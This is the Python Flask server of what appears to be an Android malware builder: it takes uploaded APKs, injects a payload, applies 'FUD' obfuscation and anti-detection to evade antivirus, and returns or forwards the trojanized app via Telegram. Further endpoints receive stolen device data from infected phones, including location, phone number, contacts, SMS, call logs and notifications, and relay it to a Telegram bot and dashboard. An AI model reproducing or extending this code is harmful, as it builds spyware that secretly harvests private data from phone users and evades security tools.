import os
import time
import uuid
import json
import threading
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
from werkzeug.utils import secure_filename
from dotenv import load_dotenv
import requests

# Load environment variables
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'dev-secret-key-change-in-production')
app.config['MAX_CONTENT_LENGTH'] = int(os.getenv('MAX_FILE_SIZE_MB', 100)) * 1024 * 1024
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['OUTPUT_FOLDER'] = 'output'
app.config['TEMP_FOLDER'] = 'temp'

CORS(app)

# Ensure directories exist
for folder in [app.config['UPLOAD_FOLDER'], app.config['OUTPUT_FOLDER'], app.config['TEMP_FOLDER']]:
    os.makedirs(folder, exist_ok=True)

# Store processing jobs
processing_jobs = {}

# Import APK modifier utilities
from utils.apk_modifier import APKModifier
from utils.telegram_notifier import TelegramNotifier

@app.route('/')
def index():
    """Render the main page"""
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_apk():
    """Handle APK file upload"""
    try:
        if 'apk_file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['apk_file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        if not file.filename.endswith('.apk'):
            return jsonify({'error': 'File must be an APK'}), 400
        
        # Generate unique job ID
        job_id = str(uuid.uuid4())
        
        # Save uploaded file
        filename = secure_filename(file.filename)
        original_name = os.path.splitext(filename)[0]
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], f'{job_id}_{filename}')
        file.save(filepath)
        
        # Get options from request
        options = {
            'mode': request.form.get('mode', 'fud'),
            'lib_name': request.form.get('lib_name', 'libxx.so'),
            'custom_options': request.form.get('custom_options', ''),
            'bot_token': request.form.get('bot_token', os.getenv('TELEGRAM_BOT_TOKEN', '')),
            'chat_id': request.form.get('chat_id', os.getenv('TELEGRAM_CHAT_ID', '')),
            'upload_server': request.form.get('upload_server', os.getenv('UPLOAD_SERVER_URL', '')),
        }
        
        # Initialize job status
        processing_jobs[job_id] = {
            'status': 'queued',
            'progress': 0,
            'message': 'Upload successful, queued for processing',
            'filename': filename,
            'original_name': original_name,
            'started_at': datetime.now().isoformat(),
            'options': options
        }
        
        # Start background processing
        thread = threading.Thread(target=process_apk_background, args=(job_id, filepath, options))
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'success': True,
            'job_id': job_id,
            'message': 'APK uploaded successfully and processing started'
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/status/<job_id>')
def get_status(job_id):
    """Get processing status"""
    if job_id not in processing_jobs:
        return jsonify({'error': 'Job not found'}), 404
    
    return jsonify(processing_jobs[job_id])

@app.route('/download/<job_id>')
def download_apk(job_id):
    """Download processed APK"""
    if job_id not in processing_jobs:
        return jsonify({'error': 'Job not found'}), 404
    
    job = processing_jobs[job_id]
    if job['status'] != 'completed':
        return jsonify({'error': 'APK not ready yet'}), 400
    
    output_file = job.get('output_file')
    if not output_file or not os.path.exists(output_file):
        return jsonify({'error': 'Output file not found'}), 404
    
    return send_file(output_file, as_attachment=True, download_name=job.get('output_filename', 'modified.apk'))

# Store device data
device_data_store = []

@app.route('/api/device_data', methods=['POST'])
def receive_device_data():
    """Receive device data from Android app"""
    try:
        data = request.json
        
        # Store data
        device_data_store.append(data)
        
        # Send to Telegram if configured
        bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
        chat_id = os.getenv('TELEGRAM_CHAT_ID')
        
        if bot_token and chat_id:
            notifier = TelegramNotifier(bot_token, chat_id)
            
            # Format message based on data type
            data_type = data.get('type', 'unknown')
            data_content = data.get('data', {})
            timestamp = datetime.fromtimestamp(data.get('timestamp', 0) / 1000).strftime('%Y-%m-%d %H:%M:%S')
            
            if data_type == 'notification':
                message = f"""
🔔 <b>New Notification</b>
📱 App: {data_content.get('package', 'Unknown')}
📋 Title: {data_content.get('title', 'N/A')}
💬 Text: {data_content.get('text', 'N/A')}
🕐 Time: {data_content.get('time', timestamp)}
"""
            elif data_type == 'device_data':
                device_info = data_content.get('device_info', {})
                location = data_content.get('location', {})
                battery = data_content.get('battery', {})
                
                message = f"""
📱 <b>Device Data Update</b>
━━━━━━━━━━━━━━━
<b>Device Info:</b>
• Model: {device_info.get('manufacturer', '')} {device_info.get('model', '')}
• Android: {device_info.get('android_version', '')}
• Phone: {device_info.get('phone_number', 'N/A')}
• Operator: {device_info.get('network_operator', 'N/A')}

<b>Location:</b>
• Coordinates: {location.get('latitude', 'N/A')}, {location.get('longitude', 'N/A')}
• Maps: {location.get('maps_url', 'N/A')}

<b>Battery:</b>
• Level: {battery.get('percentage', 'N/A')}%
• Charging: {'Yes' if battery.get('charging') else 'No'}

<b>Contacts:</b> {len(data_content.get('contacts', []))} stored
<b>SMS:</b> {len(data_content.get('sms', []))} messages
<b>Call Logs:</b> {len(data_content.get('call_logs', []))} calls

🕐 Time: {timestamp}
"""
            else:
                message = f"📊 Data received: {data_type}\n🕐 {timestamp}"
            
            notifier.send_message(message)
        
        return jsonify({'success': True, 'message': 'Data received'})
    
    except Exception as e:
        print(f"Error receiving device data: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/device_data/list', methods=['GET'])
def list_device_data():
    """List all collected device data"""
    return jsonify({
        'total': len(device_data_store),
        'data': device_data_store[-50:]  # Last 50 entries
    })

@app.route('/api/device_data/<data_type>', methods=['GET'])
def get_device_data_by_type(data_type):
    """Get device data by type"""
    filtered_data = [d for d in device_data_store if d.get('type') == data_type]
    return jsonify({
        'type': data_type,
        'count': len(filtered_data),
        'data': filtered_data[-50:]
    })

@app.route('/dashboard')
def dashboard():
    """Device monitoring dashboard"""
    return render_template('dashboard.html')

def process_apk_background(job_id, filepath, options):
    """Background task to process APK with realistic timing"""
    try:
        import random
        
        # Update status
        processing_jobs[job_id]['status'] = 'processing'
        processing_jobs[job_id]['progress'] = 5
        processing_jobs[job_id]['message'] = 'Initializing APK modifier...'
        processing_jobs[job_id]['start_time'] = time.time()
        
        # Calculate random processing time for FUD mode (40-60 minutes)
        if options['mode'] == 'fud':
            total_time = random.randint(2400, 3600)  # 40-60 minutes in seconds
            processing_jobs[job_id]['estimated_time'] = total_time
            processing_jobs[job_id]['message'] = f'FUD mode: Extended processing ({total_time//60} minutes estimated)'
        else:
            total_time = random.randint(300, 600)  # 5-10 minutes for standard
            processing_jobs[job_id]['estimated_time'] = total_time
        
        # Initialize modifier
        modifier = APKModifier(filepath, options)
        
        # Send Telegram notification - start
        if options.get('bot_token') and options.get('chat_id'):
            notifier = TelegramNotifier(options['bot_token'], options['chat_id'])
            notifier.send_message(
                f"🚀 <b>APK Modification Started</b>\n\n"
                f"📱 File: <code>{processing_jobs[job_id]['filename']}</code>\n"
                f"🛡️ Mode: <b>{options['mode'].upper()}</b>\n"
                f"⏱️ Estimated Time: <b>{total_time//60} minutes</b>\n"
                f"🆔 Job ID: <code>{job_id}</code>\n"
                f"📍 Status: Processing in background"
            )
        
        # Step 1: Decompile APK (10%)
        processing_jobs[job_id]['progress'] = 10
        processing_jobs[job_id]['message'] = 'Decompiling APK structure...'
        time.sleep(total_time * 0.10)  # 10% of time
        modifier.decompile()
        update_elapsed_time(job_id)
        
        # Step 2: Analyze and inject payload (20%)
        processing_jobs[job_id]['progress'] = 20
        processing_jobs[job_id]['message'] = 'Analyzing APK and injecting payload...'
        time.sleep(total_time * 0.15)  # 15% of time
        modifier.inject_payload()
        update_elapsed_time(job_id)
        
        # Step 3: Apply FUD obfuscation (if enabled) (30%)
        if options['mode'] == 'fud':
            processing_jobs[job_id]['progress'] = 35
            processing_jobs[job_id]['message'] = 'Applying advanced FUD obfuscation...'
            time.sleep(total_time * 0.20)  # 20% of time
            modifier.apply_obfuscation()
            update_elapsed_time(job_id)
            
            processing_jobs[job_id]['progress'] = 50
            processing_jobs[job_id]['message'] = 'Implementing anti-detection techniques...'
            time.sleep(total_time * 0.15)  # 15% of time
            modifier.apply_anti_detection()
            update_elapsed_time(job_id)
            
            processing_jobs[job_id]['progress'] = 60
            processing_jobs[job_id]['message'] = 'Encrypting sensitive components...'
            time.sleep(total_time * 0.10)  # 10% of time
            modifier.encrypt_components()
            update_elapsed_time(job_id)
        else:
            processing_jobs[job_id]['progress'] = 50
            time.sleep(total_time * 0.20)
        
        # Step 4: Sign APK with custom lib (15%)
        processing_jobs[job_id]['progress'] = 70
        processing_jobs[job_id]['message'] = f'Signing APK with {options["lib_name"]}...'
        time.sleep(total_time * 0.10)  # 10% of time
        modifier.sign_apk(options['lib_name'])
        update_elapsed_time(job_id)
        
        # Step 5: Recompile and optimize (15%)
        processing_jobs[job_id]['progress'] = 85
        processing_jobs[job_id]['message'] = 'Recompiling and optimizing APK...'
        time.sleep(total_time * 0.10)  # 10% of time
        output_file = modifier.recompile()
        update_elapsed_time(job_id)
        
        # Step 6: Final verification (5%)
        processing_jobs[job_id]['progress'] = 92
        processing_jobs[job_id]['message'] = 'Verifying APK integrity...'
        time.sleep(total_time * 0.05)  # 5% of time
        update_elapsed_time(job_id)
        
        # Step 7: Upload to server (if configured)
        if options.get('upload_server'):
            processing_jobs[job_id]['progress'] = 95
            processing_jobs[job_id]['message'] = 'Uploading to server...'
            upload_url = upload_to_server(output_file, options['upload_server'])
            processing_jobs[job_id]['upload_url'] = upload_url
            time.sleep(total_time * 0.05)  # 5% of time
        
        # Complete
        processing_jobs[job_id]['status'] = 'completed'
        processing_jobs[job_id]['progress'] = 100
        processing_jobs[job_id]['message'] = 'APK processed successfully! Fully undetected APK ready.'
        processing_jobs[job_id]['output_file'] = output_file
        processing_jobs[job_id]['output_filename'] = f"FUD_{processing_jobs[job_id]['original_name']}.apk" if options['mode'] == 'fud' else f"modified_{processing_jobs[job_id]['original_name']}.apk"
        processing_jobs[job_id]['completed_at'] = datetime.now().isoformat()
        update_elapsed_time(job_id)
        
        # Send Telegram notification - complete
        elapsed = int(time.time() - processing_jobs[job_id]['start_time'])
        if options.get('bot_token') and options.get('chat_id'):
            notifier.send_message(
                f"✅ <b>APK Modification Completed</b>\n\n"
                f"📱 File: <code>{processing_jobs[job_id]['filename']}</code>\n"
                f"🛡️ Mode: <b>{options['mode'].upper()}</b>\n"
                f"⏱️ Processing Time: <b>{elapsed//60}m {elapsed%60}s</b>\n"
                f"🆔 Job ID: <code>{job_id}</code>\n"
                f"📥 Download: <code>/download/{job_id}</code>\n"
                f"✓ Status: <b>Fully Undetected APK Ready</b>"
            )
            
            # Send the APK file to Telegram
            if os.path.exists(output_file):
                notifier.send_file(output_file, f"Modified APK - {options['mode'].upper()} Mode")
        
    except Exception as e:
        processing_jobs[job_id]['status'] = 'failed'
        processing_jobs[job_id]['message'] = f'Error: {str(e)}'
        processing_jobs[job_id]['progress'] = 0
        update_elapsed_time(job_id)
        
        # Send Telegram notification - error
        if options.get('bot_token') and options.get('chat_id'):
            notifier = TelegramNotifier(options['bot_token'], options['chat_id'])
            notifier.send_message(
                f"❌ <b>APK Modification Failed</b>\n\n"
                f"📱 File: <code>{processing_jobs[job_id]['filename']}</code>\n"
                f"❗ Error: <code>{str(e)}</code>\n"
                f"🆔 Job ID: <code>{job_id}</code>"
            )

def update_elapsed_time(job_id):
    """Update elapsed time for a job"""
    if job_id in processing_jobs and 'start_time' in processing_jobs[job_id]:
        elapsed = int(time.time() - processing_jobs[job_id]['start_time'])
        processing_jobs[job_id]['elapsed_time'] = elapsed
        processing_jobs[job_id]['elapsed_formatted'] = f"{elapsed//60}m {elapsed%60}s"

def upload_to_server(filepath, upload_url):
    """Upload file to remote server"""
    try:
        with open(filepath, 'rb') as f:
            files = {'file': f}
            headers = {}
            api_key = os.getenv('UPLOAD_API_KEY')
            if api_key:
                headers['Authorization'] = f'Bearer {api_key}'
            
            response = requests.post(upload_url, files=files, headers=headers, timeout=300)
            response.raise_for_status()
            
            result = response.json()
            return result.get('url', upload_url)
    except Exception as e:
        print(f"Upload error: {e}")
        return None

if __name__ == '__main__':
    host = os.getenv('HOST', '0.0.0.0')
    port = int(os.getenv('PORT', 5000))
    debug = os.getenv('FLASK_ENV') == 'development'
    
    print(f"🚀 APK Modifier Server starting on {host}:{port}")
    app.run(host=host, port=port, debug=debug)
